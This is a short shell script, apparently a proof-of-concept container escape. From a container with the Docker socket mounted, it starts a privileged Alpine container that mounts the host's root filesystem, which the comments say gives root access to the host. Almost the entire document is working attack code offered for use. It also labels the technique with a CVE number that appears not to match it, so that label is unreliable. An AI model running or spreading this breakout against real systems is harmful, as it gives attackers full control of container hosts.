#!/bin/sh
# This script demonstrates exploitation of CVE-2020-17526 by using the mounted Docker socket
# It launches a privileged container that mounts the host filesystem, giving host root access

# Pull a lightweight image
docker pull alpine:latest

# Run a privileged container that mounts the host root filesystem
docker run -d --privileged -v /:/host --name host_breakout alpine:latest sh -c 'while true; do sleep 3600; done'

# Keep the attacker container running
while true; do sleep 3600; done